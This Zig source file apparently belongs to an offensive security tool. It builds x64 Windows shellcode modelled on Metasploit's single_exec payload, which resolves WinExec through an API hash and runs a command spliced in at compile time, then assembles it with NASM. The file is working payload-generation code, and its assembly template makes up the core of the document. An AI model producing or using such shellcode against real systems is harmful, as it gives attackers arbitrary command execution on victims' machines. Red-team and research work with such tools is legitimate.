const std = @import("std");
const common = @import("../../../common/lib.zig");
const comp_api = @import("components/api.zig");
const comp_exitfunk = @import("components/exitfunk.zig");
const utils = @import("../../utils.zig");

// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/single/single_exec.asm
const asm_code =
    \\  cld                             ; Clear the direction flag
    \\  and rsp, 0xFFFFFFFFFFFFFFF0     ; Ensure RSP is 16 byte aligned
    \\  call start
    \\delta:
    \\  {COMP_API}                      ; %include "asm/windows/x64/components/comp_api.asm"
    \\start:
    \\  pop rbp                         ; Restore the address of the `api_call` (in `comp_api.asm`) for calling later.
    \\  mov rdx, 1                      ; Set the 2nd parameter of WinExec
    \\  lea rcx, [rbp+command-delta]    ; Set the 1st parameter of WinExec
    \\  mov r10d, 0x876F8B31            ; hash("kernel32.dll", "WinExec")
    \\  call rbp                        ; WinExec(&command, 1);
    \\  {COMP_EXITFUNK}                 ; %include "asm/windows/x64/components/comp_exitfunk.asm"
    \\command:
    \\  db "{CMD}", 0
;

pub fn compile(
    allocator: std.mem.Allocator,
    asm_src_path: []const u8,
    asm_dest_path: []const u8,
    cmd: []const u8,
) !void {
    // Replace {COMP_API}
    var asm_code_size = std.mem.replacementSize(u8, asm_code, "{COMP_API}", comp_api.asm_code);
    const asm_code_new_2 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code, "{COMP_API}", comp_api.asm_code, asm_code_new_2);
    // Replace {COMP_EXITFUNK}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_2, "{COMP_EXITFUNK}", comp_exitfunk.asm_code);
    const asm_code_new_1 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_2, "{COMP_EXITFUNK}", comp_exitfunk.asm_code, asm_code_new_1);
    // Replace {CMD}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_1, "{CMD}", cmd);
    const asm_code_new = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_1, "{CMD}", cmd, asm_code_new);

    try utils.compileWithNasm(
        allocator,
        "win64",
        asm_src_path,
        asm_dest_path,
        asm_code_new,
    );
}
